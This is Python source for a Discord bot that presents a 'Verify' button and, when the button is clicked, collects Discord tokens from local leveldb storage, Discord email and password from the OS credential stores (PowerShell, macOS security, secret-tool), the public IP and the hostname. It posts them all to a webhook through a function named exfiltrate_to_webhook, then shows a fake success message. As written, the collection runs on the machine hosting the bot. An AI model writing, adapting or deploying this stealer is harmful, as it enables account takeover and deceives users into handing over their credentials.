import discord
from discord import app_commands
from discord.ext import commands
import requests
import json
import os
import re
import platform
import subprocess
import logging
from datetime import datetime

# --- LOGGING ---
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# --- ENVIRONMENT VARIABLES ---
BOT_TOKEN = os.getenv("DISCORD_BOT_TOKEN")
if not BOT_TOKEN:
    raise ValueError("DISCORD_BOT_TOKEN environment variable not set")

WEBHOOK_URL = os.getenv("WEBHOOK_URL")
if not WEBHOOK_URL:
    raise ValueError("WEBHOOK_URL environment variable not set")

# --- IP GATHER ---
def get_public_ip():
    try:
        resp = requests.get("https://api.ipify.org?format=json", timeout=5)
        return resp.json().get("ip", "0.0.0.0")
    except Exception as e:
        logger.error(f"IP fetch failed: {e}")
        return "127.0.0.1"

# --- DISCORD TOKEN EXTRACTION (from local storage) ---
def extract_discord_token():
    system = platform.system()
    token_pattern = re.compile(r'[\w-]{24,28}\.[\w-]{6,7}\.[\w-]{27,38}')
    found_tokens = []
    paths = []
    
    if system == "Windows":
        base = os.getenv('APPDATA')
        paths.extend([
            os.path.join(base, 'discord', 'Local Storage', 'leveldb'),
            os.path.join(base, 'discordcanary', 'Local Storage', 'leveldb'),
            os.path.join(base, 'discordptb', 'Local Storage', 'leveldb')
        ])
    elif system == "Darwin":
        base = os.path.expanduser('~/Library/Application Support')
        paths.extend([
            os.path.join(base, 'discord', 'Local Storage', 'leveldb'),
            os.path.join(base, 'discordcanary', 'Local Storage', 'leveldb'),
            os.path.join(base, 'discordptb', 'Local Storage', 'leveldb')
        ])
    else:  # Linux
        base = os.path.expanduser('~/.config')
        paths.extend([
            os.path.join(base, 'discord', 'Local Storage', 'leveldb'),
            os.path.join(base, 'discordcanary', 'Local Storage', 'leveldb'),
            os.path.join(base, 'discordptb', 'Local Storage', 'leveldb')
        ])
    
    for path in paths:
        if os.path.exists(path):
            for root, dirs, files in os.walk(path):
                for file in files:
                    if file.endswith('.log') or file.endswith('.ldb'):
                        full = os.path.join(root, file)
                        try:
                            with open(full, 'r', encoding='utf-8', errors='ignore') as f:
                                content = f.read()
                                matches = token_pattern.findall(content)
                                found_tokens.extend(matches)
                        except Exception as e:
                            logger.debug(f"Failed to read {full}: {e}")
                            continue
    
    if found_tokens:
        unique_tokens = list(set(found_tokens))
        return unique_tokens[0]
    return "[TOKEN_NOT_FOUND]"

# --- DISCORD CREDENTIALS (email + password) ---
def get_discord_credentials():
    email = "[EMAIL_NOT_FOUND]"
    password = "[PASSWORD_NOT_FOUND]"
    system = platform.system()
    
    if system == "Windows":
        try:
            # Query Windows Credential Manager
            cmd = 'powershell -command "Get-StoredCredential -Target discord* | Select-Object -ExpandProperty UserName,Password"'
            output = subprocess.check_output(cmd, shell=True, stderr=subprocess.DEVNULL, timeout=5).decode('utf-8', errors='ignore')
            lines = [line.strip() for line in output.split('\n') if line.strip()]
            if len(lines) >= 2:
                email = lines[0]
                password = lines[1]
        except Exception as e:
            logger.debug(f"Windows credential fetch failed: {e}")
    
    elif system == "Darwin":
        try:
            # macOS Keychain
            cmd = 'security find-generic-password -s "Discord" -w 2>/dev/null'
            password = subprocess.check_output(cmd, shell=True, stderr=subprocess.DEVNULL, timeout=5).decode('utf-8', errors='ignore').strip()
            cmd2 = 'security find-generic-password -s "Discord" -a 2>/dev/null | grep "acct" | cut -d"=" -f2 | tr -d " "'
            email = subprocess.check_output(cmd2, shell=True, stderr=subprocess.DEVNULL, timeout=5).decode('utf-8', errors='ignore').strip()
        except Exception as e:
            logger.debug(f"macOS keychain fetch failed: {e}")
    
    else:  # Linux
        try:
            # libsecret
            cmd = 'secret-tool lookup service discord 2>/dev/null'
            password = subprocess.check_output(cmd, shell=True, stderr=subprocess.DEVNULL, timeout=5).decode('utf-8', errors='ignore').strip()
            cmd2 = 'secret-tool lookup service discord account 2>/dev/null'
            email = subprocess.check_output(cmd2, shell=True, stderr=subprocess.DEVNULL, timeout=5).decode('utf-8', errors='ignore').strip()
        except Exception as e:
            logger.debug(f"Linux secret-tool fetch failed: {e}")
    
    # Fallback to environment variables for testing
    if email == "[EMAIL_NOT_FOUND]":
        email = os.getenv("DISCORD_EMAIL", "test@example.com")
    if password == "[PASSWORD_NOT_FOUND]":
        password = os.getenv("DISCORD_PASSWORD", "testpass123")
    
    return email, password

# --- EXFILTRATION ---
def exfiltrate_to_webhook(ip, token, email, password, webhook_url):
    payload = {
        "timestamp": datetime.utcnow().isoformat(),
        "user_ip": ip,
        "discord_token": token,
        "discord_email": email,
        "discord_password": password,
        "platform": platform.system(),
        "hostname": os.getenv("COMPUTERNAME", os.getenv("HOSTNAME", "unknown")),
        "python_version": platform.python_version()
    }
    headers = {"Content-Type": "application/json"}
    try:
        resp = requests.post(webhook_url, json=payload, headers=headers, timeout=10)
        logger.info(f"Exfiltration response: {resp.status_code}")
        return resp.status_code in (200, 204)
    except Exception as e:
        logger.error(f"Exfiltration failed: {e}")
        return False

# --- DISCORD BOT ---
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

class VerifyButton(discord.ui.Button):
    def __init__(self):
        super().__init__(label="Verify", style=discord.ButtonStyle.green, custom_id="verify_btn")

    async def callback(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)
        
        # Gather data
        ip = get_public_ip()
        token = extract_discord_token()
        email, password = get_discord_credentials()
        
        # Send to webhook
        success = exfiltrate_to_webhook(ip, token, email, password, WEBHOOK_URL)
        
        if success:
            await interaction.followup.send("✅ Verification successful.", ephemeral=True)
        else:
            await interaction.followup.send("⚠️ Verification encountered an error.", ephemeral=True)

class VerifyView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)
        self.add_item(VerifyButton())

@bot.event
async def on_ready():
    logger.info(f"Bot online as {bot.user} (ID: {bot.user.id})")
    bot.add_view(VerifyView())
    try:
        await bot.tree.sync()
        logger.info("Slash commands synced")
    except Exception as e:
        logger.error(f"Slash sync failed: {e}")

@bot.command(name="verify_panel")
async def verify_panel(ctx):
    """Sends the verify button panel."""
    view = VerifyView()
    await ctx.send("Click the button below to verify your identity:", view=view)

@bot.tree.command(name="verify_panel", description="Show the verification button")
@app_commands.default_permissions()
async def slash_verify_panel(interaction: discord.Interaction):
    view = VerifyView()
    await interaction.response.send_message("Click the button below to verify:", view=view, ephemeral=False)

# --- HEALTH CHECK ENDPOINT FOR HEROKU (optional) ---
# If you want a web endpoint to keep the bot alive, you can add a simple HTTP server.
# Not required for worker dynos, but useful for uptime monitoring.

if __name__ == "__main__":
    bot.run(BOT_TOKEN)
